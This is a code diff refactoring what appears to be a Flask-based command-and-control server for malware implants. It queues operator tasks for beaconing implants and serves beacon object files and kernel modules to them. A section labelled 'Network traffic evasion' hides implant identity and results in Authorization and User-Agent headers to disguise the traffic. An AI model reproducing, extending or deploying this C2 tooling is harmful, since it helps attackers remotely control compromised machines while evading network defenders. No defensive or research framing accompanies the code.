@@ -60,23 +60,7 @@ cmdData4 = {
 };
 """
 
-class ImplantMessageType(IntEnum):
-    GET_TASK = 1
-    GET_RESOURCE = 2
-    POST_RESULT = 3
-    UNKNOWN = 4
-
 app = Flask(__name__)
-
-CHECKIN_IMPLANT_IDENTITY_HEADER = "Authorization"
-
-OUTPUT_RESULT_TASKID_HEADER =  "Authorization"
-
-OUTPUT_RESULT_STATUS_CODE_HEADER =  "User-Agent"
-def parseStatusCode(status_code):
-    print("Status code: " + status_code)
-    _, sc = status_code.split(':')
-    return sc
 
 bofsRootDir = "/bofs/"
 kmodsRootDir = "/kmods/"
@@ -94,6 +78,23 @@ TaskFifo = deque()
 InputDict = dict()
 OutputDict = dict()
 ErrorDict = dict()
+
+### Network traffic evasion (C2 <-> implant)
+class ImplantMessageType(IntEnum):
+    GET_TASK = 1
+    GET_RESOURCE = 2
+    POST_RESULT = 3
+    UNKNOWN = 4
+
+CHECKIN_IMPLANT_IDENTITY_HEADER = "Authorization"
+
+OUTPUT_RESULT_TASKID_HEADER =  "Authorization"
+
+OUTPUT_RESULT_STATUS_CODE_HEADER =  "User-Agent"
+def parseStatusCode(status_code):
+    print("Status code: " + status_code)
+    _, sc = status_code.split(':')
+    return sc
 
 def netMasquerade(Task, MsgType):
 
@@ -129,7 +130,8 @@ def netMasquerade(Task, MsgType):
 
 def netUnmasquerade(Task, MsgType):
     if MsgType == ImplantMessageType.GET_TASK:
-        return Task
+        implant_identity = base64.b64decode(request.headers.get(CHECKIN_IMPLANT_IDENTITY_HEADER)).decode('utf-8')
+        return implant_identity
 
     elif MsgType == ImplantMessageType.GET_RESOURCE:
         return Task
@@ -144,8 +146,10 @@ def netUnmasquerade(Task, MsgType):
             data = ""
 
         return data, status_code, taskID
+### end of Network traffic evasion (C2 <-> implant)
 
 
+### Handling operator's requests from console (adding new tasks and status display)
 @app.route("/")
 def main_page():
     return "<p>bofs repository</p>"
@@ -201,8 +205,10 @@ def addTask():
     
     str_out = ''.join(resp)
     return str_out
+### end of Handling operator's requests from console (adding new tasks and status display)
 
-def constructImplantTask(implant_identity):
+### Handling implant's beaconing
+def constructImplantTask(task, implant_identity):
 
     arch, os = implant_identity.split(':')
     if arch == "x86_64":
@@ -212,15 +218,13 @@ def constructImplantTask(implant_identity):
     else:
         os = "elf"
 
-    # get tasking data from TaskFifo and prepare for processing it
-    data = TaskFifo.pop()
-    cmdData = json.loads(data) # deserialize to JSON
+    cmdData = json.loads(task) # deserialize to JSON
 
     # request ID for identifying requests (task input data) with responses (tasks output)
     taskID = cmdData['id']
 
     # store task's input data for logging purposes
-    InputDict[taskID] = data
+    InputDict[taskID] = task
 
     # Based on task's input data (cmdData), prepare an implant's instruction (Instruction) for execution 
     Instruction = {
@@ -368,20 +372,25 @@ def heartbeat():
         if len(TaskFifo) == 0:
             return "nothing to do"
 
-        # get implant's identification data encoded from (previously agreed) header
-        implant_identity = base64.b64decode(request.headers.get(CHECKIN_IMPLANT_IDENTITY_HEADER)).decode('utf-8')
+        # get tasking data from TaskFifo
+        task = TaskFifo.pop()
+
+        # get implant's identification and/or authentication data
+        implant_identity = netUnmasquerade(request, msgType)
         if not implant_identity:
             return "go away"
 
-        # prepare task based on entry in the TaskFifo
-        implantTask = constructImplantTask(implant_identity)
+        # postprocess task based on operator's input and calling implant's identity
+        implantTask = constructImplantTask(task, implant_identity)
 
-        # format / mask / obsfuscate / encode task before sending
+        # format / mask / obsfuscate / encode task before putting it on the wire
         return netMasquerade(implantTask, ImplantMessageType.GET_TASK)
     else:
         return netMasquerade("", ImplantMessageType.UNKNOWN)
+### end of Handling implant's beaconing
 
 
+### Resource serving endpoints
 @app.route(bofsRootDir + '<path:path>')
 def send_report(path):
     resp = send_from_directory('bofs', path, mimetype='application/octet-stream')
@@ -391,7 +400,7 @@ def send_report(path):
 def send_kmod(path):
     resp = send_from_directory('kmods', path, mimetype='application/octet-stream')
     return netMasquerade(resp, ImplantMessageType.GET_RESOURCE)
-
+### end of Resource serving endpoints
 
 
 if __name__ == '__main__':
